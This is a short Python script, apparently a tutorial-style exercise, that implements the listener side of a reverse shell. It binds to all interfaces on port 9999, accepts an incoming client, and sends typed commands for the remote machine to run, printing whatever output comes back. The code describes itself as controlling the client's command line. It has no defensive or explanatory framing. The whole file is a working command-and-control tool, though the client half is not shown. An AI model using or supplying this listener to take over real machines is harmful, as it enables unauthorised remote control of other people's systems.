import socket
import sys

def createSocket():
    '''
    Create Sockets
    '''
    try:
        global host, port, s

        # Set host to 0.0.0.0 to allow the server to listen to external links too
        host = "0.0.0.0"

        # Use some port which is available all the time
        port = 9999

        s = socket.socket()
    
    except socket.error as err:
        print("Socker Creation Error: " + str(err))

def bind_socket():
    '''
    Bind host and port
    '''
    try:
        global host, port, s
        print("Binding Port: "+str(port))

        # Bind host and port
        s.bind((host, port))
        s.listen(5)

    except socket.error as err:
        print("Socker Binding Error: " + str(err))

def socket_Accept():
    '''
    Accepts Connections and performs tasks
    '''
    # s.accept() to get connection from client. conn->connection and add->address of the client
    conn, add = s.accept()
    #  add[0] -> host as string, add[1] -> port as int
    print("Connection has been made \n IP:" + add[0]+"\nPort:"+str(add[1]))

    # Infinite loop to perform some tasks
    sendCommand(conn)

    # Close the connection
    conn.close()

def sendCommand(conn):
    '''
    Control client's command line
    '''
    while True:
        # Python 2 compatible
        cmd = str(input())

        # Custom command
        if cmd == 'quit':
            conn.send(str.encode(cmd))
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            # Send the command to get performed
            conn.send(str.encode(cmd))

            # Print the received string
            clientRes = str(conn.recv(1024), "utf-8")
            print(clientRes)

if __name__ == "__main__":
    # Here I go....!
    createSocket()
    bind_socket()
    socket_Accept()